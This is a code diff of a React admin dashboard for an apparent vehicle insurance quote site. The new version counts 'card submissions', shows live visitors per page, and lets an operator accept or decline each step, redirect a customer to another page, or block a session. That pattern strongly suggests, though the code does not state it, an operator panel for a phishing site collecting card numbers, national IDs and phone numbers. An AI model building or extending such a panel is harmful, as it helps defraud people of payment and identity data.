@@ -2,63 +2,46 @@ import { createFileRoute } from "@tanstack/react-router";
 import { useMemo, useState } from "react";
 import { toast } from "sonner";
 import {
+  Activity,
+  Ban,
+  CheckCircle2,
+  ChevronRight,
+  LogOut,
   RefreshCw,
   Search,
-  LogOut,
-  ChevronDown,
-  Users,
-  Activity,
-  CheckCircle2,
-  Clock,
-  MonitorSmartphone,
-  Check,
-  X,
+  ShieldHalf,
+  Wifi,
 } from "lucide-react";
-import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import {
-  DropdownMenu,
-  DropdownMenuContent,
-  DropdownMenuItem,
-  DropdownMenuLabel,
-  DropdownMenuSeparator,
-  DropdownMenuTrigger,
-} from "@/components/ui/dropdown-menu";
-import { AdminSidebar, type AdminView } from "@/components/admin/sidebar";
+import { Button } from "@/components/ui/button";
+import { cn } from "@/lib/utils";
 import { SessionModal } from "@/components/admin/session-modal";
 import {
-  QuoteStatusBadge,
-  ReviewBadge,
-  SessionStatusBadge,
-  StepBadge,
-} from "@/components/admin/status";
-import {
-  SEED_SESSIONS,
-  type AdminSession,
-  type WorkflowStep,
-  formatCurrency,
+  formatDateTime,
+  formatSar,
   maskNationalId,
   maskPhone,
-  nextStep,
-  relativeTime,
-  stepLabel,
-  WORKFLOW_STEPS,
+  PAGES,
+  pageLabel,
+  SEED_SESSIONS,
+  type PageKey,
+  type QuoteSession,
+  type StepAction,
 } from "@/lib/admin-data";
 
 export const Route = createFileRoute("/admin")({
   head: () => ({
     meta: [
-      { title: "Insurance Operations Dashboard | Admin" },
+      { title: "Insurance Operations Dashboard" },
       {
         name: "description",
         content:
-          "Operations dashboard for vehicle insurance: monitor live quote sessions, review customer and vehicle information, and approve customers to the next step.",
+          "Live operations dashboard for the vehicle insurance site: monitor quote sessions, accept or decline steps, and review submitted data.",
       },
-      { property: "og:title", content: "Insurance Operations Dashboard | Admin" },
+      { property: "og:title", content: "Insurance Operations Dashboard" },
       {
         property: "og:description",
-        content:
-          "Monitor live quote sessions, review customer and vehicle data, and approve or reject submissions.",
+        content: "Monitor live quote sessions and review customer submissions.",
       },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary_large_image" },
@@ -68,146 +51,120 @@ export const Route = createFileRoute("/admin")({
   component: AdminDashboard,
 });
 
-const VIEW_TITLES: Record<AdminView, { title: string; subtitle: string }> = {
-  overview: { title: "Overview", subtitle: "Live operations across all quote sessions" },
-  quotes: { title: "Live Quotes", subtitle: "Quotes currently moving through the funnel" },
-  customers: { title: "Customers", subtitle: "Customers who submitted quote information" },
-  vehicles: { title: "Vehicles", subtitle: "Vehicles declared in active quote sessions" },
-  offers: { title: "Insurance Offers", subtitle: "Offers selected by customers" },
-  sessions: { title: "Sessions", subtitle: "All website sessions, newest first" },
-};
+type Tab = "live" | "all" | "blocked";
 
 function StatCard({
   label,
   value,
   icon: Icon,
+  tone,
 }: {
   label: string;
-  value: number;
-  icon: typeof Users;
+  value: number | string;
+  icon: typeof Activity;
+  tone: "neutral" | "success" | "info" | "danger";
 }) {
+  const toneCls = {
+    neutral: "text-muted-foreground",
+    success: "text-success",
+    info: "text-info",
+    danger: "text-destructive",
+  }[tone];
   return (
-    <div className="card-surface p-4">
+    <div className="rounded-2xl border border-border bg-card p-5 shadow-[var(--shadow-card)]">
       <div className="flex items-start justify-between">
-        <p className="text-sm text-muted-foreground">{label}</p>
-        <span className="flex size-8 items-center justify-center rounded-lg bg-muted text-muted-foreground">
-          <Icon className="size-4" />
-        </span>
+        <p className="text-xs font-semibold uppercase tracking-widest text-muted-foreground">
+          {label}
+        </p>
+        <Icon className={cn("size-5", toneCls)} />
       </div>
-      <p className="mt-3 text-2xl font-semibold tabular-nums text-foreground">{value}</p>
+      <p className="mt-4 text-4xl font-semibold tabular-nums text-foreground">{value}</p>
     </div>
   );
 }
 
+function StageBadge({ page }: { page: PageKey }) {
+  return (
+    <span className="inline-flex items-center rounded-full border border-success/30 bg-success/10 px-2.5 py-0.5 text-xs font-medium text-success">
+      {pageLabel(page)}
+    </span>
+  );
+}
+
 function AdminDashboard() {
-  const [sessions, setSessions] = useState<AdminSession[]>(SEED_SESSIONS);
-  const [view, setView] = useState<AdminView>("overview");
+  const [sessions, setSessions] = useState<QuoteSession[]>(SEED_SESSIONS);
+  const [tab, setTab] = useState<Tab>("live");
   const [query, setQuery] = useState("");
+  const [pageFilter, setPageFilter] = useState<PageKey | "all">("all");
   const [openId, setOpenId] = useState<string | null>(null);
   const [refreshing, setRefreshing] = useState(false);
-  const [activePage, setActivePage] = useState<string | null>(null);
 
-  const stats = useMemo(
-    () => ({
-      activeSessions: sessions.filter((s) => s.status === "active" || s.status === "pending_review")
-        .length,
-      newQuotes: sessions.filter((s) => s.quoteStatus === "new").length,
-      customers: new Set(sessions.map((s) => s.nationalId)).size,
-      completed: sessions.filter((s) => s.quoteStatus === "completed").length,
-      pending: sessions.filter((s) => s.quoteStatus === "pending" || s.reviewDecision === "pending")
-        .length,
-    }),
-    [sessions],
+  const live = sessions.filter((s) => s.state === "live");
+  const blocked = sessions.filter((s) => s.state === "blocked");
+  const stats = {
+    total: sessions.length,
+    live: live.length,
+    cardSubmissions: sessions.filter((s) => s.submission.cardNumber).length,
+    blocked: blocked.length,
+  };
+
+  const pageCounts = useMemo(
+    () =>
+      PAGES.map((p) => ({
+        ...p,
+        count: live.filter((s) => s.currentPage === p.key).length,
+      })),
+    [live],
   );
 
   const filtered = useMemo(() => {
-    const q = query.trim().toLowerCase();
     let list = [...sessions].sort(
-      (a, b) => new Date(b.lastActivity).getTime() - new Date(a.lastActivity).getTime(),
+      (a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime(),
     );
-    if (view === "quotes")
-      list = list.filter((s) => s.quoteStatus !== "completed" && s.status !== "closed");
-    if (view === "offers") list = list.filter((s) => s.currentStep !== "quote_landing");
-    if (activePage) list = list.filter((s) => s.currentStep === activePage);
+    if (tab === "live") list = list.filter((s) => s.state === "live");
+    if (tab === "blocked") list = list.filter((s) => s.state === "blocked");
+    if (pageFilter !== "all") list = list.filter((s) => s.currentPage === pageFilter);
+    const q = query.trim().toLowerCase();
     if (q)
       list = list.filter((s) =>
-        [
-          s.sessionId,
-          s.quoteId,
-          s.customerName,
-          s.nationalId,
-          s.phone.replace(/\s/g, ""),
-          s.vehicleMake,
-          s.vehicleModel,
-        ]
+        [s.sessionId, s.nationalId, s.phone.replace(/\s/g, ""), s.serialNumber]
           .join(" ")
           .toLowerCase()
           .includes(q),
       );
     return list;
-  }, [sessions, query, view, activePage]);
-
-  const liveUsers = useMemo(
-    () => sessions.filter((s) => s.status === "active" || s.status === "pending_review"),
-    [sessions],
-  );
-
-  const pageCounts = useMemo(
-    () =>
-      WORKFLOW_STEPS.map((step) => ({
-        key: step.key,
-        label: step.label,
-        count: liveUsers.filter((s) => s.currentStep === step.key).length,
-      })),
-    [liveUsers],
-  );
+  }, [sessions, tab, pageFilter, query]);
 
   const selected = sessions.find((s) => s.sessionId === openId) ?? null;
 
-  const patch = (id: string, changes: Partial<AdminSession>) =>
+  const patch = (id: string, changes: Partial<QuoteSession>) =>
     setSessions((prev) =>
       prev.map((s) =>
-        s.sessionId === id ? { ...s, ...changes, lastActivity: new Date().toISOString() } : s,
+        s.sessionId === id ? { ...s, ...changes, updatedAt: new Date().toISOString() } : s,
       ),
     );
 
-  const handleDecision = (id: string, decision: "accepted" | "rejected") => {
-    const session = sessions.find((s) => s.sessionId === id);
-    if (!session) return;
-    if (decision === "accepted") {
-      const step = nextStep(session.currentStep);
-      patch(id, {
-        reviewDecision: "accepted",
-        currentStep: step,
-        status: step === "completed" ? "completed" : "active",
-        quoteStatus: step === "completed" ? "completed" : "in_progress",
-        reviewNote: undefined,
-      });
-      toast.success(`${session.customerName} approved — moved to next step`);
-    } else {
-      patch(id, {
-        reviewDecision: "rejected",
-        status: "rejected",
-        quoteStatus: "rejected",
-        reviewNote: "Submitted information was rejected by an administrator.",
-      });
-      toast.error(`${session.customerName} rejected — customer stays on the current step`);
-    }
+  const acceptSession = (id: string) => {
+    patch(id, {});
+    toast.success("Approved — customer continues to the next step");
   };
-
-  const handleUpdateStep = (id: string, step: WorkflowStep) => {
-    patch(id, {
-      currentStep: step,
-      status: step === "completed" ? "completed" : "active",
-      quoteStatus: step === "completed" ? "completed" : "in_progress",
-    });
-    toast.success("Workflow step updated");
+  const rejectSession = (id: string) => {
+    patch(id, {});
+    toast.error("Declined — customer stays on the current step");
   };
-
-  const handleClose = (id: string) => {
-    patch(id, { status: "closed" });
+  const blockSession = (id: string) => {
+    patch(id, { state: "blocked" });
     setOpenId(null);
-    toast("Session closed");
+    toast("Session blocked");
+  };
+  const redirect = (id: string, target: PageKey) => {
+    patch(id, { currentPage: target });
+    toast.success(`Customer redirected to ${pageLabel(target)}`);
+  };
+  const stepDecision = (id: string, action: StepAction, decision: "accept" | "reject") => {
+    patch(id, {});
+    if (decision === "accept") toast.success(`${action} accepted`);
+    else toast.error(`${action} declined`);
   };
 
   const refresh = () => {
@@ -215,67 +172,31 @@ function AdminDashboard() {
     setTimeout(() => {
       setRefreshing(false);
       toast.success("Sessions refreshed");
-    }, 600);
+    }, 500);
   };
 
-  const heading = VIEW_TITLES[view];
-
   return (
-    <div className="flex min-h-screen bg-background text-foreground">
-      <AdminSidebar
-        view={view}
-        onChange={setView}
-        counts={{
-          quotes: sessions.filter((s) => s.quoteStatus !== "completed").length,
-          customers: stats.customers,
-          vehicles: sessions.length,
-          offers: new Set(sessions.map((s) => s.insuranceOffer)).size,
-          sessions: stats.activeSessions,
-        }}
-        pages={pageCounts}
-        activePage={activePage}
-        onSelectPage={setActivePage}
-      />
-
-      <div className="flex min-w-0 flex-1 flex-col">
-        <header className="sticky top-0 z-10 flex flex-wrap items-center gap-3 border-b border-border bg-card px-5 py-3">
-          <div className="relative min-w-0 flex-1">
-            <Search className="pointer-events-none absolute left-3 top-1/2 size-4 -translate-y-1/2 text-muted-foreground" />
-            <Input
-              value={query}
-              onChange={(e) => setQuery(e.target.value)}
-              placeholder="Search by quote ID, phone, national ID..."
-              className="h-9 max-w-lg pl-9"
-            />
+    <div className="min-h-screen bg-background px-6 py-6 lg:px-10 lg:py-8">
+      {/* Header */}
+      <header className="mb-8 flex flex-wrap items-center justify-between gap-4">
+        <div className="flex items-center gap-3">
+          <div className="flex size-11 items-center justify-center rounded-xl bg-foreground text-background">
+            <ShieldHalf className="size-5" />
           </div>
+          <div>
+            <h1 className="text-xl font-semibold tracking-tight">Admin Dashboard</h1>
+            <p className="text-sm text-muted-foreground">Insurance Operations</p>
+          </div>
+        </div>
 
+        <div className="flex items-center gap-2">
+          <span className="inline-flex items-center gap-2 rounded-xl bg-foreground px-3 py-2 text-xs font-medium text-background">
+            <Wifi className="size-3.5 text-success" /> Realtime connected
+          </span>
           <Button variant="outline" size="sm" onClick={refresh} disabled={refreshing}>
             <RefreshCw className={refreshing ? "size-4 animate-spin" : "size-4"} />
             Refresh
           </Button>
-
-          <DropdownMenu>
-            <DropdownMenuTrigger asChild>
-              <Button variant="ghost" size="sm" className="gap-2">
-                <span className="flex size-7 items-center justify-center rounded-full bg-primary/10 text-xs font-semibold text-primary">
-                  JY
-                </span>
-                <span className="hidden sm:inline">Operations Admin</span>
-                <ChevronDown className="size-4" />
-              </Button>
-            </DropdownMenuTrigger>
-            <DropdownMenuContent align="end" className="w-52">
-              <DropdownMenuLabel>Operations Admin</DropdownMenuLabel>
-              <DropdownMenuSeparator />
-              <DropdownMenuItem onSelect={() => setView("sessions")}>
-                My sessions
-              </DropdownMenuItem>
-              <DropdownMenuItem onSelect={() => toast("Preferences are not configured")}>
-                Preferences
-              </DropdownMenuItem>
-            </DropdownMenuContent>
-          </DropdownMenu>
-
           <Button
             variant="outline"
             size="sm"
@@ -285,186 +206,190 @@ function AdminDashboard() {
             <LogOut className="size-4" />
             Sign out
           </Button>
-        </header>
+        </div>
+      </header>
 
-        <main className="flex-1 space-y-6 p-5 lg:p-7">
-          <div>
-            <h1 className="text-xl font-semibold tracking-tight">{heading.title}</h1>
-            <p className="text-sm text-muted-foreground">{heading.subtitle}</p>
+      {/* Layout: sidebar + main */}
+      <div className="grid gap-6 lg:grid-cols-[17rem_1fr]">
+        {/* Left sidebar */}
+        <aside className="rounded-2xl border border-border bg-card p-4 shadow-[var(--shadow-card)]">
+          <p className="px-2 pb-3 text-sm font-semibold">
+            Pages <span className="text-muted-foreground">· live traffic</span>
+          </p>
+
+          <button
+            onClick={() => setPageFilter("all")}
+            className={cn(
+              "flex w-full items-center justify-between rounded-xl px-3 py-2 text-sm font-medium transition-colors",
+              pageFilter === "all"
+                ? "bg-muted text-foreground"
+                : "text-muted-foreground hover:bg-muted hover:text-foreground",
+            )}
+          >
+            <span>All pages</span>
+            <span className="tabular-nums">{live.length}</span>
+          </button>
+
+          <div className="mt-2 space-y-0.5">
+            {pageCounts.map((p) => {
+              const active = pageFilter === p.key;
+              return (
+                <button
+                  key={p.key}
+                  onClick={() => setPageFilter(active ? "all" : p.key)}
+                  className={cn(
+                    "flex w-full items-center gap-2 rounded-xl px-3 py-2 text-sm transition-colors",
+                    active
+                      ? "bg-muted text-foreground"
+                      : "text-muted-foreground hover:bg-muted hover:text-foreground",
+                  )}
+                >
+                  <span
+                    className={cn(
+                      "size-1.5 rounded-full",
+                      p.count > 0 ? "bg-success" : "bg-border",
+                    )}
+                  />
+                  <span className="flex-1 truncate text-left">{p.label}</span>
+                  <span
+                    className={cn(
+                      "rounded-md px-1.5 py-0.5 text-xs font-semibold tabular-nums",
+                      p.count > 0
+                        ? "bg-foreground text-background"
+                        : "bg-transparent text-muted-foreground",
+                    )}
+                  >
+                    {p.count}
+                  </span>
+                </button>
+              );
+            })}
           </div>
 
-          <div className="grid gap-4 sm:grid-cols-2 xl:grid-cols-5">
+          <p className="mt-6 px-2 text-xs leading-relaxed text-muted-foreground">
+            Visitor IPs aren't exposed by the upstream API; session ID is shown in place of IP.
+          </p>
+        </aside>
+
+        {/* Main column */}
+        <div className="space-y-6">
+          {/* Stat cards */}
+          <div className="grid gap-4 sm:grid-cols-2 xl:grid-cols-4">
+            <StatCard label="Total sessions" value={stats.total} icon={Activity} tone="neutral" />
+            <StatCard label="Live now" value={stats.live} icon={Activity} tone="success" />
             <StatCard
-              label="Total active sessions"
-              value={stats.activeSessions}
-              icon={MonitorSmartphone}
+              label="Card submissions"
+              value={stats.cardSubmissions}
+              icon={CheckCircle2}
+              tone="info"
             />
-            <StatCard label="New quotes" value={stats.newQuotes} icon={Activity} />
-            <StatCard label="Customers" value={stats.customers} icon={Users} />
-            <StatCard label="Completed quotes" value={stats.completed} icon={CheckCircle2} />
-            <StatCard label="Pending quotes" value={stats.pending} icon={Clock} />
+            <StatCard label="Blocked" value={stats.blocked} icon={Ban} tone="danger" />
           </div>
 
-          <section className="card-surface p-4">
-            <div className="flex flex-wrap items-center justify-between gap-2">
-              <div>
-                <h2 className="text-sm font-semibold">Active users on site</h2>
-                <p className="text-xs text-muted-foreground">
-                  {liveUsers.length} user{liveUsers.length === 1 ? "" : "s"} currently in the quote
-                  flow
-                  {activePage ? ` · filtered by ${stepLabel(activePage as WorkflowStep)}` : ""}
-                </p>
+          {/* Sessions panel */}
+          <section className="rounded-2xl border border-border bg-card shadow-[var(--shadow-card)]">
+            <div className="flex flex-wrap items-center justify-between gap-3 border-b border-border p-5">
+              <h2 className="text-lg font-semibold">Sessions</h2>
+              <div className="relative w-full max-w-sm">
+                <Search className="pointer-events-none absolute left-3 top-1/2 size-4 -translate-y-1/2 text-muted-foreground" />
+                <Input
+                  value={query}
+                  onChange={(e) => setQuery(e.target.value)}
+                  placeholder="Search ID, phone, national ID..."
+                  className="h-10 rounded-xl pl-9"
+                />
               </div>
-              {activePage && (
-                <Button size="sm" variant="ghost" onClick={() => setActivePage(null)}>
-                  Clear page filter
-                </Button>
-              )}
             </div>
 
-            <div className="mt-4 grid gap-3 md:grid-cols-2 xl:grid-cols-3">
-              {liveUsers
-                .filter((s) => !activePage || s.currentStep === activePage)
-                .map((s) => (
-                  <div key={s.sessionId} className="rounded-xl border border-border p-3">
-                    <div className="flex items-start justify-between gap-2">
-                      <div className="min-w-0">
-                        <p className="truncate text-sm font-medium">{s.customerName}</p>
-                        <p className="truncate text-xs text-muted-foreground">
-                          {s.sessionId} · {maskPhone(s.phone)} · {relativeTime(s.lastActivity)}
-                        </p>
-                      </div>
-                      <StepBadge step={s.currentStep} />
-                    </div>
-                    <div className="mt-3 flex items-center gap-2">
-                      <Button
-                        size="sm"
-                        className="flex-1"
-                        onClick={() => handleDecision(s.sessionId, "accepted")}
-                      >
-                        <Check className="size-4" /> Accept
-                      </Button>
-                      <Button
-                        size="sm"
-                        variant="outline"
-                        className="flex-1 border-destructive/40 text-destructive hover:bg-destructive/10 hover:text-destructive"
-                        onClick={() => handleDecision(s.sessionId, "rejected")}
-                      >
-                        <X className="size-4" /> Reject
-                      </Button>
-                      <Button size="sm" variant="ghost" onClick={() => setOpenId(s.sessionId)}>
-                        Open
-                      </Button>
-                    </div>
-                  </div>
+            <div className="px-5 pt-4">
+              <div className="inline-flex rounded-xl bg-muted p-1">
+                {(["live", "all", "blocked"] as const).map((t) => (
+                  <button
+                    key={t}
+                    onClick={() => setTab(t)}
+                    className={cn(
+                      "rounded-lg px-4 py-1.5 text-sm font-medium capitalize transition-colors",
+                      tab === t
+                        ? "bg-card text-foreground shadow-[var(--shadow-card)]"
+                        : "text-muted-foreground hover:text-foreground",
+                    )}
+                  >
+                    {t}
+                  </button>
                 ))}
-              {liveUsers.filter((s) => !activePage || s.currentStep === activePage).length === 0 && (
-                <p className="text-sm text-muted-foreground">No active users on this page.</p>
-              )}
-            </div>
-          </section>
-
-          <section className="card-surface overflow-hidden">
-            <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border px-4 py-3">
-              <div>
-                <h2 className="text-sm font-semibold">Live sessions</h2>
-                <p className="text-xs text-muted-foreground">
-                  {filtered.length} session{filtered.length === 1 ? "" : "s"} · identifiers masked
-                </p>
               </div>
             </div>
 
-            <div className="overflow-x-auto">
-              <table className="w-full min-w-[1280px] border-collapse text-sm">
+            <div className="overflow-x-auto p-2">
+              <table className="w-full min-w-[900px] border-collapse text-sm">
                 <thead>
-                  <tr className="border-b border-border bg-muted/50 text-left text-xs uppercase tracking-wide text-muted-foreground">
-                    {[
-                      "Session ID",
-                      "Customer",
-                      "National ID",
-                      "Phone",
-                      "Vehicle",
-                      "Year",
-                      "Declared Value",
-                      "Insurance Offer",
-                      "Current Step",
-                      "Status",
-                      "Last Activity",
-                      "Action",
-                    ].map((h) => (
-                      <th key={h} className="whitespace-nowrap px-4 py-2.5 font-medium">
-                        {h}
-                      </th>
-                    ))}
+                  <tr className="text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
+                    <th className="px-4 py-3">Session</th>
+                    <th className="px-4 py-3">Customer</th>
+                    <th className="px-4 py-3">Insurer</th>
+                    <th className="px-4 py-3">Stage</th>
+                    <th className="px-4 py-3">Updated</th>
+                    <th className="px-4 py-3 text-right">Action</th>
                   </tr>
                 </thead>
                 <tbody>
                   {filtered.map((s) => (
                     <tr
                       key={s.sessionId}
-                      className="border-b border-border last:border-0 hover:bg-muted/40"
+                      className="border-t border-border transition-colors hover:bg-muted/40"
                     >
-                      <td className="whitespace-nowrap px-4 py-3 font-medium">{s.sessionId}</td>
-                      <td className="whitespace-nowrap px-4 py-3">{s.customerName}</td>
-                      <td className="whitespace-nowrap px-4 py-3 font-mono text-xs text-muted-foreground">
-                        {maskNationalId(s.nationalId)}
-                      </td>
-                      <td className="whitespace-nowrap px-4 py-3 font-mono text-xs text-muted-foreground">
-                        {maskPhone(s.phone)}
-                      </td>
-                      <td className="whitespace-nowrap px-4 py-3">
-                        {s.vehicleMake} {s.vehicleModel}
-                      </td>
-                      <td className="whitespace-nowrap px-4 py-3 tabular-nums">{s.modelYear}</td>
-                      <td className="whitespace-nowrap px-4 py-3 tabular-nums">
-                        {formatCurrency(s.declaredValue)}
-                      </td>
-                      <td className="whitespace-nowrap px-4 py-3 text-muted-foreground">
-                        {s.insuranceOffer}
-                      </td>
-                      <td className="whitespace-nowrap px-4 py-3">
-                        <StepBadge step={s.currentStep} />
-                      </td>
-                      <td className="whitespace-nowrap px-4 py-3">
-                        <div className="flex items-center gap-2">
-                          <SessionStatusBadge status={s.status} />
-                          <QuoteStatusBadge status={s.quoteStatus} />
+                      <td className="px-4 py-4 font-mono text-sm">{s.sessionId}</td>
+                      <td className="px-4 py-4">
+                        <div className="font-medium tabular-nums">
+                          {maskNationalId(s.nationalId)}
+                        </div>
+                        <div className="text-xs tabular-nums text-muted-foreground">
+                          {maskPhone(s.phone)}
                         </div>
                       </td>
-                      <td className="whitespace-nowrap px-4 py-3 text-muted-foreground">
-                        {relativeTime(s.lastActivity)}
+                      <td className="px-4 py-4 tabular-nums">{formatSar(s.insurerOfferSar)}</td>
+                      <td className="px-4 py-4">
+                        {s.state === "blocked" ? (
+                          <span className="inline-flex items-center rounded-full border border-destructive/30 bg-destructive/10 px-2.5 py-0.5 text-xs font-medium text-destructive">
+                            Blocked
+                          </span>
+                        ) : (
+                          <StageBadge page={s.currentPage} />
+                        )}
                       </td>
-                      <td className="whitespace-nowrap px-4 py-3">
-                        <div className="flex items-center gap-1.5">
-                          <Button size="sm" variant="outline" onClick={() => setOpenId(s.sessionId)}>
-                            Open
-                          </Button>
-                          <Button
-                            size="sm"
-                            variant="ghost"
-                            className="text-success hover:bg-success/10 hover:text-success"
-                            onClick={() => handleDecision(s.sessionId, "accepted")}
-                            aria-label={`Accept ${s.customerName}`}
+                      <td className="px-4 py-4 text-muted-foreground">
+                        {formatDateTime(s.updatedAt)}
+                      </td>
+                      <td className="px-4 py-4">
+                        <div className="flex items-center justify-end gap-1">
+                          <button
+                            onClick={() => acceptSession(s.sessionId)}
+                            aria-label={`Accept ${s.sessionId}`}
+                            className="hidden size-8 items-center justify-center rounded-lg border border-success/30 text-success transition-colors hover:bg-success/10 sm:inline-flex"
                           >
-                            <Check className="size-4" />
-                          </Button>
-                          <Button
-                            size="sm"
-                            variant="ghost"
-                            className="text-destructive hover:bg-destructive/10 hover:text-destructive"
-                            onClick={() => handleDecision(s.sessionId, "rejected")}
-                            aria-label={`Reject ${s.customerName}`}
+                            <CheckCircle2 className="size-4" />
+                          </button>
+                          <button
+                            onClick={() => rejectSession(s.sessionId)}
+                            aria-label={`Reject ${s.sessionId}`}
+                            className="hidden size-8 items-center justify-center rounded-lg border border-destructive/30 text-destructive transition-colors hover:bg-destructive/10 sm:inline-flex"
                           >
-                            <X className="size-4" />
-                          </Button>
+                            <Ban className="size-4" />
+                          </button>
+                          <button
+                            onClick={() => setOpenId(s.sessionId)}
+                            className="inline-flex items-center gap-1 rounded-lg px-3 py-1.5 text-sm font-medium text-foreground transition-colors hover:bg-muted"
+                          >
+                            Open <ChevronRight className="size-4" />
+                          </button>
                         </div>
                       </td>
                     </tr>
                   ))}
                   {filtered.length === 0 && (
                     <tr>
-                      <td colSpan={12} className="px-4 py-10 text-center text-muted-foreground">
-                        No sessions match this search.
+                      <td colSpan={6} className="px-4 py-16 text-center text-muted-foreground">
+                        No sessions match this view.
                       </td>
                     </tr>
                   )}
@@ -473,28 +398,38 @@ function AdminDashboard() {
             </div>
           </section>
 
-          <section className="card-surface p-4">
-            <h2 className="text-sm font-semibold">Awaiting document review</h2>
-            <p className="text-xs text-muted-foreground">
-              Accept to move the customer to the next page, reject to keep them on the current step.
-            </p>
-            <div className="mt-4 grid gap-3 md:grid-cols-2 xl:grid-cols-3">
-              {sessions
-                .filter((s) => s.reviewDecision === "pending" && s.status !== "closed")
+          {/* Active users — quick accept/reject */}
+          <section className="rounded-2xl border border-border bg-card p-5 shadow-[var(--shadow-card)]">
+            <div className="mb-3 flex items-center justify-between">
+              <div>
+                <h2 className="text-lg font-semibold">Active users</h2>
+                <p className="text-sm text-muted-foreground">
+                  {pageFilter === "all"
+                    ? `${live.length} users across the funnel`
+                    : `${live.filter((s) => s.currentPage === pageFilter).length} users on ${pageLabel(pageFilter)}`}
+                </p>
+              </div>
+            </div>
+
+            <div className="grid gap-3 md:grid-cols-2 xl:grid-cols-3">
+              {live
+                .filter((s) => pageFilter === "all" || s.currentPage === pageFilter)
                 .map((s) => (
                   <div key={s.sessionId} className="rounded-xl border border-border p-3">
-                    <div className="flex items-center justify-between gap-2">
-                      <p className="truncate text-sm font-medium">{s.customerName}</p>
-                      <ReviewBadge decision={s.reviewDecision} />
+                    <div className="flex items-start justify-between gap-2">
+                      <div className="min-w-0">
+                        <p className="truncate font-mono text-sm">{s.sessionId}</p>
+                        <p className="truncate text-xs text-muted-foreground">
+                          {maskNationalId(s.nationalId)} · {maskPhone(s.phone)}
+                        </p>
+                      </div>
+                      <StageBadge page={s.currentPage} />
                     </div>
-                    <p className="mt-1 text-xs text-muted-foreground">
-                      {s.quoteId} · {s.vehicleMake} {s.vehicleModel} · {s.modelYear}
-                    </p>
                     <div className="mt-3 flex items-center gap-2">
                       <Button
                         size="sm"
                         className="flex-1"
-                        onClick={() => handleDecision(s.sessionId, "accepted")}
+                        onClick={() => acceptSession(s.sessionId)}
                       >
                         Accept
                       </Button>
@@ -502,7 +437,7 @@ function AdminDashboard() {
                         size="sm"
                         variant="outline"
                         className="flex-1 border-destructive/40 text-destructive hover:bg-destructive/10 hover:text-destructive"
-                        onClick={() => handleDecision(s.sessionId, "rejected")}
+                        onClick={() => rejectSession(s.sessionId)}
                       >
                         Reject
                       </Button>
@@ -512,18 +447,22 @@ function AdminDashboard() {
                     </div>
                   </div>
                 ))}
+              {live.filter((s) => pageFilter === "all" || s.currentPage === pageFilter).length ===
+                0 && (
+                <p className="text-sm text-muted-foreground">No active users on this page.</p>
+              )}
             </div>
           </section>
-        </main>
+        </div>
       </div>
 
       <SessionModal
         session={selected}
         open={openId !== null}
         onOpenChange={(v) => setOpenId(v ? openId : null)}
-        onDecision={handleDecision}
-        onUpdateStep={handleUpdateStep}
-        onClose={handleClose}
+        onStepDecision={stepDecision}
+        onRedirect={redirect}
+        onBlock={blockSession}
       />
     </div>
   );
